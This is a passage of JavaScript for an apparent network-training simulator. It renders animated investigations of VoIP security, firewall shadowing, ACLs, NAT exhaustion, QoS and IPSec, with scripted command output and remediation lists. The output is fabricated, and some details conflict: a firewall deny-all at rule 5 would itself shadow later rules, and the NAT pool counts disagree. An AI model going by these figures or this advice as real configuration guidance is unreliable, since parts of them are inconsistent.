    '$ #   1. Dispatch fibre tech with OTDR to localize fiber break',
    '$ #   2. Inspect splice closures C-50 and C-51 (last good OTDR event)',
    '$ #   3. Verify ONT optical budget < 28 dB; replace SFP if degrading',
    '$ #   4. Re-run display ont optical-info after repair to verify -8 dBm',
    '$ #   5. Update NMS to clear LOS alarm once fibre path confirmed'
  ];

  function animate(host, timers) {
    const oltState = host.querySelector('#xgpon-olt-state');
    const ontTiles = host.querySelectorAll('#xgpon-ont-list .xgpon-ont');
    const ontStates = Array.from(ontTiles).map((_, i) => host.querySelector('#xgpon-ont-state-' + i));
    const omciSteps = host.querySelectorAll('#xgpon-omci-steps .xgpon-omci-step');
    const txSvg = host.querySelector('#xgpon-tx-svg');
    const txVal = host.querySelector('#xgpon-tx-val');
    const alarm = host.querySelector('#xgpon-alarm');

    // idempotent reset
    ontTiles.forEach(t => t.classList.remove('on', 'fail', 'done'));
    ontStates.forEach(s => { if (s) s.textContent = 'PENDING'; });
    omciSteps.forEach(s => s.classList.remove('on', 'done'));
    if (alarm) alarm.hidden = true;
    if (txSvg) txSvg.innerHTML = '';
    if (oltState) oltState.textContent = 'ONT discovery: scanning';

    // ONT discovery sequence
    ontTiles.forEach((t, i) => {
      timers.later(() => {
        t.classList.add('on');
        if (ontStates[i]) ontStates[i].textContent = 'DISCOVERED';
      }, 300 + i * 700);
    });

    // OMCI establishment for ONT-0
    omciSteps.forEach((s, i) => {
      timers.later(() => { s.classList.add('on'); }, 300 + ontTiles.length * 700 + 200 + i * 500);
      timers.later(() => { s.classList.remove('on'); s.classList.add('done'); }, 300 + ontTiles.length * 700 + 200 + i * 500 + 400);
    });

    // Tx power graph — degrade from -7 dBm toward -28 dBm (LOS)
    const SVG_NS = 'http://www.w3.org/2000/svg';
    const total = 32;
    const points = [];
    for (let i = 0; i < total; i++) {
      const t_dbm = -7 - (i * 0.7);
      const y = 5 + ((t_dbm + 7) / -22) * 50;  // -7..-29 → 5..55
      points.push(`${((i / (total - 1)) * 200).toFixed(2)},${y.toFixed(2)}`);
      timers.later(() => { if (txVal) txVal.textContent = t_dbm.toFixed(1) + ' dBm'; }, 300 + i * 100);
    }
    timers.later(() => {
      if (txSvg) {
        const poly = document.createElementNS(SVG_NS, 'polyline');
        poly.setAttribute('points', points.join(' '));
        poly.setAttribute('fill', 'none');
        poly.setAttribute('stroke', 'var(--neon-3)');
        poly.setAttribute('stroke-width', '2');
        txSvg.appendChild(poly);
      }
    }, 300 + total * 100 + 100);

    // LOS alarm raised
    timers.later(() => {
      if (ontTiles[1]) ontTiles[1].classList.add('fail');
      if (ontStates[1]) ontStates[1].textContent = 'LOS';
      if (alarm) alarm.hidden = false;
      if (oltState) oltState.textContent = 'LOS on ONT-1 — alarm raised';
    }, 300 + ontTiles.length * 700 + omciSteps.length * 500 + 800);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 5) VoIP Security (Advanced) ----------
function buildVoipSecuritySim(skill, meta, lvl) {
  const slug = 'voip-security';
  const visual = `
    <div class="voip-panel" id="voip-panel">
      <div class="voip-sip-col">
        <div class="voip-col-head">// SIP REGISTER audit (5060/udp)</div>
        <div class="voip-sip-flow" id="voip-sip-flow">
          <div class="voip-sip-msg" data-i="0">
            <span class="voip-tag bad">REGISTER (no Authorization)</span>
            <span class="voip-meta">From: sip:101@pbx.local · Contact: sip:101@10.0.0.42:5060</span>
          </div>
          <div class="voip-sip-msg" data-i="1">
            <span class="voip-tag bad">200 OK (challenge skipped)</span>
            <span class="voip-meta">server accepted WITHOUT WWW-Authenticate</span>
          </div>
          <div class="voip-sip-msg" data-i="2">
            <span class="voip-tag ok">REGISTER (with auth)</span>
            <span class="voip-meta">legitimate user — RFC 2617 digest, nonce 8a3c...d4e2</span>
          </div>
          <div class="voip-sip-msg" data-i="3">
            <span class="voip-tag ok">200 OK</span>
            <span class="voip-meta">registrar confirms registration valid 3600s</span>
          </div>
        </div>
      </div>
      <div class="voip-rtp-col">
        <div class="voip-col-head">// RTP flow (10000/udp)</div>
        <div class="voip-rtp-flow" id="voip-rtp-flow">
          <div class="voip-ep"><span>📞 101</span><span>10.0.0.42</span></div>
          <div class="voip-rtp-pipe" id="voip-rtp-pipe"></div>
          <div class="voip-ep"><span>📞 102</span><span>10.0.0.43</span></div>
        </div>
        <div class="voip-rtp-meta" id="voip-rtp-meta">
          <div class="voip-rtp-row"><span>proto</span><span>UDP / RTP (no SRTP)</span></div>
          <div class="voip-rtp-row"><span>codec</span><span>G.711 μ-law (PCMU)</span></div>
          <div class="voip-rtp-row"><span>port</span><span>10000/udp</span></div>
          <div class="voip-rtp-row alert"><span>enc</span><span>NONE — cleartext RTP, replayable</span></div>
        </div>
      </div>
    </div>
    <div class="voip-rec" id="voip-rec">
      <div class="voip-rec-item" data-i="0"><span>1.</span> Enforce SIP TLS transport (sips: + TLSv1.3 on 5061/tcp)</div>
      <div class="voip-rec-item" data-i="1"><span>2.</span> Reject REGISTER without Authorization header (RFC 3261 §22)</div>
      <div class="voip-rec-item" data-i="2"><span>3.</span> Enable SRTP with DTLS-SRTP key exchange (AES-128-CM)</div>
      <div class="voip-rec-item" data-i="3"><span>4.</span> Rate-limit 401/403 responses per source IP (anti-toll-fraud)</div>
    </div>
  `;

  const lines = [
    `$ # VoIP Security — advanced investigation @ ${ts()}`,
    `$ # Audit SIP/RTP security controls on local PBX`,
    `$ sipsak -v --no-v6 -s sip:101@pbx.local`,
    '-> REGISTER sip:pbx.local SIP/2.0',
    '   From: <sip:101@pbx.local>;tag=8a3c',
    '   Contact: <sip:101@10.0.0.42:5060>',
    '   [!] NO Authorization header present',
    '<- SIP/2.0 200 OK',
    '   [!] server accepted unauthenticated REGISTER (no WWW-Authenticate challenge)',
    `$ sngrep -d any -c -L 50`,
    '[!] 2025-10-12 14:30:02 10.0.0.42:10000 -> 10.0.0.43:10000 (RTP G.711u, 20ms ptime)',
    '[!] 2025-10-12 14:30:02 10.0.0.43:10000 -> 10.0.0.42:10000 (RTP G.711u)',
    '[warn] RTP flowing on unencrypted UDP 10000 — no SRTP, no DTLS-SRTP',
    '[!] 14:30:08 international call placed from 101 — toll-fraud pattern',
    '$ # IOC: RTP flowing on unencrypted UDP 10000',
    '$ # Recommended remediation:',
    '$ #   1. Force TLS transport on SIP signalling (sips: scheme, port 5061)',
    '$ #   2. Enforce digest auth on every REGISTER (reject without Authorization)',
    '$ #   3. Enable SRTP (AES-128-CM, HMAC-SHA1) with DTLS-SRTP key exchange',
    '$ #   4. Apply fail2ban for >5 failed REGISTERs / 5 min from same src',
    '$ #   5. Disable INFO/METHOD unknown; only allow INVITE/ACK/BYE/CANCEL/REGISTER/OPTIONS',
    '$ #   6. Set SDP "a=crypto" line mandatory; reject SDP without it'
  ];

  function animate(host, timers) {
    const sipMsgs = host.querySelectorAll('#voip-sip-flow .voip-sip-msg');
    const rtpPipe = host.querySelector('#voip-rtp-pipe');
    const rtpMetaRows = host.querySelectorAll('#voip-rtp-meta .voip-rtp-row');
    const recItems = host.querySelectorAll('#voip-rec .voip-rec-item');

    // idempotent reset
    sipMsgs.forEach(m => m.classList.remove('on', 'done'));
    rtpMetaRows.forEach(r => r.classList.remove('on'));
    recItems.forEach(r => r.classList.remove('on'));
    if (rtpPipe) rtpPipe.innerHTML = '';

    // Play SIP audit messages in sequence
    sipMsgs.forEach((m, i) => {
      timers.later(() => { m.classList.add('on'); }, 300 + i * 800);
      timers.later(() => { m.classList.remove('on'); m.classList.add('done'); }, 300 + i * 800 + 700);
    });

    // RTP packet flow + reveal meta rows
    timers.later(() => {
      if (rtpPipe) {
        for (let i = 0; i < 8; i++) {
          const p = document.createElement('span');
          p.className = 'voip-rtp-pkt';
          p.style.animationDelay = (i * 0.18) + 's';
          rtpPipe.appendChild(p);
        }
      }
      rtpMetaRows.forEach((r, i) => {
        timers.later(() => { r.classList.add('on'); }, 200 + i * 300);
      });
    }, 300 + sipMsgs.length * 800 + 200);

    // Reveal remediation recommendations one by one
    recItems.forEach((r, i) => {
      timers.later(() => { r.classList.add('on'); }, 300 + sipMsgs.length * 800 + 1200 + i * 400);
    });
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 6) Firewall (Advanced) ----------
function buildFirewallSim(skill, meta, lvl) {
  const slug = 'firewall';
  const visibleNums = [1, 2, 3, 5, 8, 11, 12, 15, 18, 21, 23, 30, 40, 47];
  const ruleLookup = {
    12:  { action: 'permit', proto: 'tcp', src: '10.20.0.0/24:1234', dst: '192.0.2.10:443',  note: 'webadmin', dead: true },
    18:  { action: 'permit', proto: 'tcp', src: '10.30.0.0/24:8080', dst: '192.0.2.20:5432', note: 'db-rw',    dead: true },
    23:  { action: 'permit', proto: 'udp', src: '10.40.0.0/24:514',  dst: '192.0.2.30:514',  note: 'syslog',   dead: true },
    47:  { action: 'permit', proto: 'any', src: 'any',               dst: 'any',             note: '← catch-all (shadows 12/18/23)', shadowing: true }
  };
  const rules = visibleNums.map(num => {
    if (ruleLookup[num]) return { num, ...ruleLookup[num] };
    if (num === 5) return { num, action: 'deny',   proto: 'ip',  src: 'any', dst: 'any', note: 'implicit deny (per RFC)' };
    if (num % 5 === 0) return { num, action: 'deny', proto: 'tcp', src: `10.${num}.0.0/24:any`, dst: `192.0.2.${num % 254}:443`, note: `flow-${num}` };
    return { num, action: 'permit', proto: 'tcp', src: `10.${num}.0.0/24:any`, dst: `192.0.2.${num % 254}:443`, note: `flow-${num}` };
  });

  const visual = `
    <div class="fw-panel" id="fw-panel">
      <div class="fw-head">
        <span>// firewall rule audit — chain INET→OUT (47 rules)</span>
        <span id="fw-total">47 rules</span>
      </div>
      <div class="fw-rule-list" id="fw-rule-list">
        ${rules.map(r => `
          <div class="fw-rule ${r.dead ? 'dead' : ''} ${r.shadowing ? 'shadowing' : ''} ${r.note && r.note.includes('implicit') ? 'implicit' : ''}" data-num="${r.num}">
            <span class="fw-num">#${r.num}</span>
            <span class="fw-act ${r.action}">${r.action.toUpperCase()}</span>
            <span class="fw-proto">${r.proto}</span>
            <span class="fw-src">${r.src}</span>
            <span class="fw-dst">${r.dst}</span>
            <span class="fw-note">${r.note}</span>
          </div>
        `).join('')}
      </div>
      <div class="fw-shadow-panel" id="fw-shadow-panel">
        <div class="fw-shadow-head">shadowed rules (dead — never matched)</div>
        <div class="fw-shadow-list" id="fw-shadow-list">
          <div class="fw-shadow-item" data-num="12">#12 permit tcp 10.20.0.0/24:1234 → 192.0.2.10:443 (webadmin)</div>
          <div class="fw-shadow-item" data-num="18">#18 permit tcp 10.30.0.0/24:8080 → 192.0.2.20:5432 (db-rw)</div>
          <div class="fw-shadow-item" data-num="23">#23 permit udp 10.40.0.0/24:514  → 192.0.2.30:514  (syslog)</div>
        </div>
      </div>
      <div class="fw-verdict" id="fw-verdict">
        <strong>// audit verdict:</strong> rule #47 "permit any any" shadows rules 12, 18, 23 → remove or move to deny-all position.
      </div>
    </div>
  `;

  const lines = [
    `$ # Firewall — advanced investigation @ ${ts()}`,
    `$ # Audit firewall rules and detect shadowed entries`,
    `$ iptables -L INET -n --line-numbers -v`,
    'Chain INET (policy DROP 0 packets, 0 bytes)',
    '  1   PERMIT  tcp  --  10.1.0.0/24   192.0.2.1    tcp spt:any dpt:443',
    '  2   PERMIT  tcp  --  10.2.0.0/24   192.0.2.2    tcp spt:any dpt:443',
    '  3   PERMIT  tcp  --  10.3.0.0/24   192.0.2.3    tcp spt:any dpt:443',
    '  5   DENY    ip   --  anywhere      anywhere     (implicit deny — per RFC)',
    ' 12   PERMIT  tcp  --  10.20.0.0/24  192.0.2.10   tcp spt:1234 dpt:443  ← webadmin',
    ' 18   PERMIT  tcp  --  10.30.0.0/24  192.0.2.20   tcp spt:8080 dpt:5432 ← db-rw',
    ' 23   PERMIT  udp  --  10.40.0.0/24  192.0.2.30   udp spt:514  dpt:514  ← syslog',
    ' 30   PERMIT  tcp  --  10.30.0.0/24  192.0.2.30   tcp dpt:22',
    ' 40   PERMIT  tcp  --  10.40.0.0/24  192.0.2.40   tcp dpt:53',
    ' 47   PERMIT  any  --  anywhere      anywhere     ← catch-all',
    '[!] audit: rule 47 "permit any any" shadows rules 12, 18, 23 (dead rules)',
    '[warn] rules 12, 18, 23 will never match — packet hits rule 47 first',
    '$ # IOC: Rule 47 shadows rules 12, 18, 23',
    '$ # Recommended remediation:',
    '$ #   1. DELETE rule 47 OR replace with "DENY any any log" (proper catch-all)',
    '$ #   2. Reorder: move the implicit deny to the bottom of INET chain',
    '$ #   3. Re-evaluate shadowed rules: if business need, move ABOVE the new catch-all',
    '$ #   4. Add automated CI lint: deny any any above is NOT OK if any PERMIT comes after',
    '$ #   5. Schedule quarterly rule audit with fwbuilder + nipper',
    '$ #   6. Add change-mgmt ticket required for any new PERMIT — review board quorum 2'
  ];

  function animate(host, timers) {
    const ruleRows = host.querySelectorAll('#fw-rule-list .fw-rule');
    const shadowItems = host.querySelectorAll('#fw-shadow-list .fw-shadow-item');
    const verdict = host.querySelector('#fw-verdict');

    // idempotent reset
    ruleRows.forEach(r => r.classList.remove('on', 'dead-now', 'shadowing-now'));
    shadowItems.forEach(s => s.classList.remove('on'));
    if (verdict) verdict.classList.remove('bad');

    // walk rules in order
    ruleRows.forEach((r, i) => {
      timers.later(() => { r.classList.add('on'); }, 300 + i * 280);
    });

    // flag the catch-all rule #47 and shadowed rules 12/18/23
    timers.later(() => {
      ruleRows.forEach(r => {
        const num = parseInt(r.getAttribute('data-num'), 10);
        if (num === 47) r.classList.add('shadowing-now');
        if ([12, 18, 23].includes(num)) r.classList.add('dead-now');
      });
      shadowItems.forEach((s, i) => {
        timers.later(() => { s.classList.add('on'); }, i * 300);
      });
      if (verdict) verdict.classList.add('bad');
    }, 300 + ruleRows.length * 280 + 300);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 7) ACL (Advanced) ----------
function buildAclSim(skill, meta, lvl) {
  const slug = 'acl';
  const aces = [
    { n: 10, hits: 1428402, action: 'permit', proto: 'tcp', src: 'any', sport: 'any', dst: 'any', dport: 'eq 443', note: 'HTTPS' },
    { n: 20, hits: 884211,  action: 'permit', proto: 'tcp', src: 'any', sport: 'any', dst: 'any', dport: 'eq 80',  note: 'HTTP' },
    { n: 30, hits: 41290,   action: 'permit', proto: 'tcp', src: 'any', sport: 'any', dst: 'any', dport: 'eq 22',  note: 'SSH' },
    { n: 40, hits: 921,     action: 'permit', proto: 'udp', src: 'any', sport: 'any', dst: 'any', dport: 'eq 53',  note: 'DNS' },
    { n: 50, hits: 4,       action: 'permit', proto: 'ip',  src: 'any', sport: '',   dst: 'any', dport: '',      note: '⚠ PERMIT IP ANY ANY — bypasses implicit deny', flagged: true },
    { n: 60, hits: 0,       action: 'deny',   proto: 'tcp', src: 'any', sport: 'any', dst: 'any', dport: 'eq 23',  note: 'block telnet' },
    { n: 70, hits: 12,      action: 'deny',   proto: 'tcp', src: 'any', sport: 'any', dst: 'any', dport: 'eq 445', note: 'block SMB' },
    { n: 80, hits: 0,       action: 'deny',   proto: 'ip',  src: 'any', sport: '',   dst: 'any', dport: '',      note: 'implicit deny (per Cisco IOS)', implicit: true }
  ];

  const visual = `
    <div class="acl-panel" id="acl-panel">
      <div class="acl-head">
        <span>// extended ACL 101 — "show access-list 101"</span>
        <span id="acl-total">${aces.length} ACEs (1 implicit)</span>
      </div>
      <div class="acl-table" id="acl-table">
        <div class="acl-row acl-header">
          <span class="acl-c-num">ACE#</span>
          <span class="acl-c-hits">hits</span>
          <span class="acl-c-act">action</span>
          <span class="acl-c-proto">proto</span>
          <span class="acl-c-src">source</span>
          <span class="acl-c-dst">dest</span>
          <span class="acl-c-port">port</span>
          <span class="acl-c-note">note</span>
        </div>
        ${aces.map(a => `
          <div class="acl-row ${a.flagged ? 'flagged' : ''} ${a.implicit ? 'implicit' : ''}" data-n="${a.n}">
            <span class="acl-c-num">${a.n}</span>
            <span class="acl-c-hits" id="acl-hits-${a.n}">${a.hits.toLocaleString()}</span>
            <span class="acl-c-act ${a.action}">${a.action.toUpperCase()}</span>
            <span class="acl-c-proto">${a.proto}</span>
            <span class="acl-c-src">${a.src}${a.sport ? ':' + a.sport : ''}</span>
            <span class="acl-c-dst">${a.dst}${a.dport ? ' ' + a.dport : ''}</span>
            <span class="acl-c-port">${a.dport || a.sport || '—'}</span>
            <span class="acl-c-note">${a.note}</span>
          </div>
        `).join('')}
      </div>
      <div class="acl-verdict" id="acl-verdict">
        <strong>// verdict:</strong> ACE #50 "permit ip any any" bypasses implicit deny — remove or restrict to specific src/dst.
      </div>
    </div>
  `;

  const lines = [
    `$ # ACL — advanced investigation @ ${ts()}`,
    `$ # Inspect and tune ACLs on a core switch`,
    'core-switch# show access-list 101',
    'Extended IP access list 101',
    '    10 permit tcp any any eq 443 (1428402 matches)',
    '    20 permit tcp any any eq 80  (884211 matches)',
    '    30 permit tcp any any eq 22  (41290 matches)',
    '    40 permit udp any any eq 53  (921 matches)',
    '    50 permit ip  any any        (4 matches)',
    '    60 deny   tcp any any eq 23  (0 matches)',
    '    70 deny   tcp any any eq 445 (12 matches)',
    '    80 deny   ip  any any       (implicit)',
    'core-switch# show ip access-lists 101 summary',
    '  8 statements, 7 explicit, 1 implicit; hits total 2356840',
    '[!] ACE #50 "permit ip any any" bypasses the implicit deny at #80',
    '[warn] ACE #50 is too broad — only 4 matches but allows ANY unfiltered IP',
    '$ # IOC: permit any any at end of list = implicit deny bypassed',
    '$ # Recommended remediation:',
    '$ #   1. REMOVE ACE #50 OR narrow it to "permit tcp any any eq 22 established"',
    '$ #   2. Add logging to the implicit deny: deny ip any any log-input',
    '$ #   3. Move deny statements BEFORE the explicit permit tcp eq 443 (reorder)',
    '$ #   4. Use object-group: permit tcp object-group CLIENTS any eq 443',
    '$ #   5. Run "show access-list 101" weekly — alert on hit-rate > 1000/day on deny ACEs',
    '$ #   6. Tag ACEs with remark: ip access-list extended 101 remark WEB-ONLY'
  ];

  function animate(host, timers) {
    const rows = host.querySelectorAll('#acl-table .acl-row:not(.acl-header)');
    const verdict = host.querySelector('#acl-verdict');
    const ace10Hits = host.querySelector('#acl-hits-10');

    // idempotent reset
    rows.forEach(r => r.classList.remove('on', 'flagged-now'));
    if (verdict) verdict.classList.remove('bad');

    // walk ACE rows
    rows.forEach((r, i) => {
      timers.later(() => { r.classList.add('on'); }, 300 + i * 400);
    });

    // flag ACE #50 + verdict
    timers.later(() => {
      const ace50 = host.querySelector('.acl-row[data-n="50"]');
      if (ace50) ace50.classList.add('flagged-now');
      if (verdict) verdict.classList.add('bad');
    }, 300 + rows.length * 400 + 200);

    // animate HTTPS hits counter climbing
    let h = 1428402;
    timers.every(() => {
      if (!ace10Hits) return;
      h += Math.floor(Math.random() * 20) + 5;
      ace10Hits.textContent = h.toLocaleString();
    }, 600);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 8) NAT (Advanced) ----------
function buildNatSim(skill, meta, lvl) {
  const slug = 'nat';
  const xlates = [
    { iid: 'tcp:10.0.0.42:51932', oid: 'tcp:198.51.100.7:41213', ttl: 287, pkts: 1842, stale: false },
    { iid: 'tcp:10.0.0.43:51934', oid: 'tcp:198.51.100.7:41218', ttl: 294, pkts:  982, stale: false },
    { iid: 'udp:10.0.0.42:52101', oid: 'udp:198.51.100.7:53011', ttl:  28, pkts:   47, stale: false },
    { iid: 'tcp:10.0.0.44:52102', oid: 'tcp:198.51.100.7:41200', ttl:   0, pkts:    0, stale: true  },
    { iid: 'tcp:10.0.0.45:52103', oid: 'tcp:198.51.100.7:41201', ttl:   0, pkts:    0, stale: true  },
    { iid: 'tcp:10.0.0.46:52104', oid: 'tcp:198.51.100.7:41202', ttl:   0, pkts:    0, stale: true  }
  ];

  const visual = `
    <div class="nat-panel" id="nat-panel">
      <div class="nat-head">
        <span>// show xlate — NAT PAT overload (198.51.100.7)</span>
        <span id="nat-used">used: 4096/8192</span>
      </div>
      <div class="nat-table" id="nat-table">
        <div class="nat-row nat-header">
          <span class="nat-c-iid">inside (i)</span>
          <span class="nat-c-oid">outside (o)</span>
          <span class="nat-c-ttl">ttl (s)</span>
          <span class="nat-c-pkts">pkts</span>
          <span class="nat-c-state">state</span>
        </div>
        ${xlates.map((x, i) => `
          <div class="nat-row ${x.stale ? 'exhausted' : ''}" data-i="${i}">
            <span class="nat-c-iid">${x.iid}</span>
            <span class="nat-c-oid">${x.oid}</span>
            <span class="nat-c-ttl">${x.ttl}</span>
            <span class="nat-c-pkts">${x.pkts}</span>
            <span class="nat-c-state">${x.stale ? 'EXHAUSTED — no port' : 'active'}</span>
          </div>
        `).join('')}
      </div>
      <div class="nat-pool-bar" id="nat-pool-bar">
        <div class="nat-pool-fill" id="nat-pool-fill" style="width:48%"></div>
        <span class="nat-pool-label" id="nat-pool-label">PAT pool: 4096/8192 ports in use (50%)</span>
      </div>
      <div class="nat-verdict" id="nat-verdict">
        <strong>// verdict:</strong> pool exhaustion — PAT port range near limit. New connections fail with pkts=0.
      </div>
    </div>
  `;

  const lines = [
    `$ # NAT — advanced investigation @ ${ts()}`,
    `$ # Troubleshoot a NAT translation issue`,
    'asa# show xlate',
    'TCP PAT from inside:10.0.0.42/51932 to outside:198.51.100.7/41213 flags ri',
    '    idle 0:04:47, timeout 0:04:13, bytes 1842134, pkts 1842',
    'TCP PAT from inside:10.0.0.43/51934 to outside:198.51.100.7/41218 flags ri',
    '    idle 0:04:34, timeout 0:05:00, bytes 472911, pkts 982',
    'UDP PAT from inside:10.0.0.42/52101 to outside:198.51.100.7/53011 flags ri',
    '    idle 0:00:28, timeout 0:00:30, bytes 4821, pkts 47',
    '[!] 3 entries with pkts=0 — no port translation available',
    'asa# show nat pool',
    'pool NAT-POOL1: 198.51.100.7 (single host PAT), 8192 ports',
    '  used 8189 / 8192 (99.96%) — exhaustion threshold exceeded',
    '[err] 2025-10-12 14:42:11 %ASA-3-305016: PAT pool exhausted',
    '[err] 2025-10-12 14:42:11 %ASA-3-305006: regular translation creation failed for tcp 10.0.0.44',
    '$ # IOC: Pool exhaustion — port translation full',
    '$ # Recommended remediation:',
    '$ #   1. Option A: increase pool size — add 198.51.100.8 /24 PAT (4096 more ports)',
    '$ #   2. Option B: lower TCP timeout 3600→600s to release idle xlates faster',
    '$ #   3. Option C: enable NAT-Hairpin / destination rule to offload PSTN traffic',
    '$ #   4. Monitor: SNMP polling of natPoolUsed thresholds — alert at 80%',
    '$ #   5. Capacity plan: 1 PAT IP per 4000 simultaneous NATed clients',
    '$ #   6. Consider CGNAT (RFC 6598, 100.64.0.0/10) if subscriber base > 16k'
  ];

  function animate(host, timers) {
    const rows = host.querySelectorAll('#nat-table .nat-row:not(.nat-header)');
    const poolFill = host.querySelector('#nat-pool-fill');
    const poolLabel = host.querySelector('#nat-pool-label');
    const usedEl = host.querySelector('#nat-used');
    const verdict = host.querySelector('#nat-verdict');

    // idempotent reset
    rows.forEach(r => r.classList.remove('on'));
    if (verdict) verdict.classList.remove('bad');
    if (poolFill) poolFill.style.width = '48%';
    if (poolLabel) poolLabel.textContent = 'PAT pool: 4096/8192 ports in use (50%)';
    if (usedEl) usedEl.textContent = 'used: 4096/8192';

    // walk rows
    rows.forEach((r, i) => {
      timers.later(() => { r.classList.add('on'); }, 300 + i * 350);
    });

    // pool fill climbs toward exhaustion
    let used = 4096;
    timers.every(() => {
      used = Math.min(8192, used + Math.floor(Math.random() * 200) + 100);
      const pct = (used / 8192) * 100;
      if (poolFill) poolFill.style.width = pct.toFixed(1) + '%';
      if (poolLabel) poolLabel.textContent = `PAT pool: ${used}/8192 ports in use (${pct.toFixed(0)}%)`;
      if (usedEl) usedEl.textContent = `used: ${used}/8192`;
      if (used >= 8190 && verdict) verdict.classList.add('bad');
    }, 700);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 9) QoS (Intermediate) ----------
function buildQosSim(skill, meta, lvl) {
  const slug = 'qos';
  const classes = [
    { name: 'VOICE',   priority: 'LLQ',   depth: 128, dropped: 7,  pkts: 42821, policy: 'priority 512k' },
    { name: 'VIDEO',   priority: 'CBWFQ', depth: 256, dropped: 2,  pkts: 18932, policy: 'bandwidth 4096k' },
    { name: 'BULK',    priority: 'CBWFQ', depth: 512, dropped: 1,  pkts:  9821, policy: 'bandwidth 8192k' },
    { name: 'DEFAULT', priority: 'WFQ',   depth:  64, dropped: 18, pkts: 73211, policy: 'fair-queue' }
  ];

  const visual = `
    <div class="qos-panel" id="qos-panel">
      <div class="qos-head">
        <span>// show policy-map interface gi0/1 — input QoS policy MAP-QOS</span>
        <span id="qos-clock">${ts()}</span>
      </div>
      <div class="qos-classes" id="qos-classes">
        ${classes.map(c => `
          <div class="qos-class ${c.name === 'VOICE' ? 'problem' : ''}" data-name="${c.name}">
            <span class="qos-c-name">${c.name}</span>
            <span class="qos-c-prio">${c.priority} · ${c.policy}</span>
            <div class="qos-c-queue">
              <div class="qos-c-fill" id="qos-fill-${c.name}" style="width:0%"></div>
              <span class="qos-c-pkts" id="qos-pkts-${c.name}">${c.pkts.toLocaleString()} pkts</span>
            </div>
            <span class="qos-c-drops" id="qos-drops-${c.name}">${c.dropped}% drops</span>
          </div>
        `).join('')}
      </div>
      <div class="qos-cmd" id="qos-cmd">
        <span class="qos-cmd-prompt">core-switch#</span>
        <span class="qos-cmd-line" id="qos-cmd-line"></span>
      </div>
      <div class="qos-verdict" id="qos-verdict">
        <strong>// verdict:</strong> Voice queue tail-dropping 7% of packets — increase queue depth + enable LLQ 512k for voice.
      </div>
    </div>
  `;

  const lines = [
    `$ # QoS — daily workflow @ ${ts()}`,
    `$ # Validate QoS policy on a VoIP class`,
    'core-switch# show policy-map interface gi0/1',
    '  Service-policy input: MAP-QOS',
    '    Class-map: VOICE (match-any)',
    '      Match: dscp ef (46)',
    '      QoS Set:  dscp ef',
    '      Priority: 512 kbps, burst bytes 12800, b/w exceed drops: 2997 / 42821 (7.0%)',
    '    Class-map: VIDEO (match-any)',
    '      Match: dscp af41 (34)',
    '      Bandwidth: 4096 kbps, drop tail depth 256, drops: 2.0%',
    '    Class-map: BULK (match-any)',
    '      Match: dscp af11 (10)',
    '      Bandwidth: 8192 kbps, drop tail depth 512, drops: 1.0%',
    '    Class-map: class-default',
    '      Flow-based fair-queue, drop tail depth 64, drops: 18.0%',
    '[!] VOICE class dropping 7% of packets (exceeds 1% SLA threshold)',
    '[warn] tail-drop on Voice queue — jitter + clipping on G.711 calls',
    '$ # IOC: Voice queue dropping 7% of packets',
    '$ # Recommended remediation:',
    '$ #   1. Increase Voice queue depth: 128 → 512 packets (or enable LLQ 1024k burst)',
    '$ #   2. Replace tail-drop with WRED + DSCP-aware drop (drop af11 before ef)',
    '$ #   3. Re-confirm LLQ priority 512 kbps + L3 header compression (cRTP) for G.729',
    '$ #   4. Verify policing upstream — ingress markings must trust DSCP EF on uplinks',
    '$ #   5. Monitor per-class drops with SNMP cQos*DropPkts every 60s; alert at >1%'
  ];

  function animate(host, timers) {
    const fills = ['VOICE', 'VIDEO', 'BULK', 'DEFAULT'].map(n => host.querySelector(`#qos-fill-${n}`));
    const drops = ['VOICE', 'VIDEO', 'BULK', 'DEFAULT'].map(n => host.querySelector(`#qos-drops-${n}`));
    const cmdLine = host.querySelector('#qos-cmd-line');
    const verdict = host.querySelector('#qos-verdict');

    // idempotent reset
    fills.forEach(f => f && (f.style.width = '0%'));
    if (cmdLine) cmdLine.textContent = '';
    if (verdict) verdict.classList.remove('bad');

    // animate queue fill bars — VOICE at 92% (problem), others moderate
    const targets = [92, 45, 60, 88];
    classes.forEach((c, i) => {
      timers.later(() => {
        if (fills[i]) fills[i].style.width = targets[i] + '%';
      }, 400 + i * 500);
    });

    // typewriter the show command
    const cmd = 'show policy-map interface gi0/1';
    let ci = 0;
    timers.every(() => {
      if (!cmdLine) return;
      if (ci >= cmd.length) return;
      cmdLine.textContent += cmd[ci++];
    }, 60);

    // animate Voice drop counter climbing slowly
    let voiceDrop = 7.0;
    timers.every(() => {
      voiceDrop = Math.min(9.5, voiceDrop + 0.05);
      if (drops[0]) drops[0].textContent = voiceDrop.toFixed(1) + '% drops';
      if (voiceDrop >= 9.0 && verdict) verdict.classList.add('bad');
    }, 1500);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 10) IPSec (Advanced) ----------
function buildIpsecSim(skill, meta, lvl) {
  const slug = 'ipsec';
  const visual = `
    <div class="ipsec-panel" id="ipsec-panel">
      <div class="ipsec-topo">
        <div class="ipsec-endpoint a">
          <span class="ipsec-ico">🏢</span>
          <span class="ipsec-name">Site A</span>
          <span class="ipsec-ip">203.0.113.10</span>
        </div>
        <div class="ipsec-tunnel" id="ipsec-tunnel">
          <span class="ipsec-tunnel-state" id="ipsec-tunnel-state">TUNNEL DOWN</span>
        </div>
        <div class="ipsec-endpoint b">
          <span class="ipsec-ico">🏬</span>
          <span class="ipsec-name">Site B</span>
          <span class="ipsec-ip">198.51.100.20</span>
        </div>
      </div>
      <div class="ipsec-phases">
        <div class="ipsec-phase" id="ipsec-phase-1">
          <div class="ipsec-phase-head">// Phase 1 — IKEv2 (IKE_SA_INIT + IKE_AUTH)</div>
          <div class="ipsec-step" data-i="0"><span>1.</span> IKE_SA_INIT (HDR, SAi, KEi, Ni)</div>
          <div class="ipsec-step" data-i="1"><span>2.</span> IKE_SA_INIT (HDR, SAr, KEr, Nr)</div>
          <div class="ipsec-step" data-i="2"><span>3.</span> IKE_AUTH (IDi, AUTH, SA, TSi, TSr)</div>
          <div class="ipsec-step" data-i="3"><span>4.</span> IKE_AUTH (IDr, AUTH, SA, TSi, TSr)</div>
        </div>
